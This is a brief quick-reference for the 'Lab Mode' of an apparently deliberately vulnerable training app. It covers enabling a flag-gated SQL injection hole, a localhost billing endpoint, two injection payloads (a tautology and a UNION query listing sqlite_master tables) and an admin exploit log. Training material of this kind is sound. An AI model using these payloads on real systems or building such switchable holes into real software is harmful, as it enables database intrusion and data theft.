# Lab Mode Quick Reference

## Enable Lab Mode (Training Only)

To enable the intentional SQL injection vulnerability for cybersecurity training:

1. Open `app.py`
2. Find the line: `LAB_MODE = False`
3. Change to: `LAB_MODE = True`
4. Restart the application

## Access Lab Endpoint

Once enabled, access the vulnerable billing endpoint:
```
http://localhost:5000/lab/billing
```

## Test SQL Injection

Try this payload to test:
```
' OR '1'='1' --
```

Or enumerate hidden tables:
```
' UNION SELECT name,2,3,4,5,6,7 FROM sqlite_master WHERE type='table' --
```

## View Exploitation Logs

As admin user, visit:
```
http://localhost:5000/admin/exploiters
```

To see who exploited the vulnerability.

## IMPORTANT

⚠️ **LAB_MODE must be False in production**
- Never enable on public networks
- Only for authorized training
- Always disable before deployment

See `LAB_MODE_SETUP.md` for complete documentation.
